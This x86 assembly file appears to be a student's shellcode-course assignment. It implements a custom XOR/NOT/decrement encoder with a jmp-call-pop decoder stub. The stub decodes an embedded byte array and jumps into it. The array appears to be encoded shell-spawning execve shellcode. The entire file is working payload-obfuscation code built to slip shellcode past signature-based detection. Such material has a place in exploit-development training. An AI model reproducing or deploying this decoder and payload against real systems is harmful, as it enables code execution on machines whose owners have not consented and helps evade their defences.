/*
Tool:                   Custom Encoder
Encoding Scheme:        XOR with 0xaa -> Increment by 1 -> NOT -> XOR with 0xaa
Author:                 Mohit Suyal (@mosunit)
Student ID:             PA-16521
Blog:                   https://mosunit.com
*/

global _start

section .text

_start:

jmp short shellcode

decoder:
        // retrive address of encoded shellcode using jmp-call-pop technique
        pop esi

decode_stub:
        // first operation - XOR with 0xaa
        xor byte [esi], 0xaa

        // jump when xored with dummy byte - signifies end of shellcode
        // pass the control for execution when complete shellcode is decoded
        jz encoded_shellcode

        // second operatino - NOT
        not byte [esi]

        // third operation - decrement by 1 byte
        dec byte [esi]

        // fourth operation - XOR with 0xaa
        xor byte [esi], 0xaa

        // counter to increament to next byte in shellcode
        inc esi

        // decode loop
        jmp short decode_stub


shellcode:
        call decoder

        // encoded shellcode
        // shellcode ends with dummy byte 0xaa - signifies end of shellcode
        encoded_shellcode: db 0xc9,0x3e,0xae,0x96,0x90,0xd3,0x8f,0x96,0x96,0xd3,0xd3,0x9c,0x91,0x71,0x1f,0xae,0x71,0x1c,0xaf,0x71,0x19,0x4e,0xf7,0x3d,0x7e,0xaa
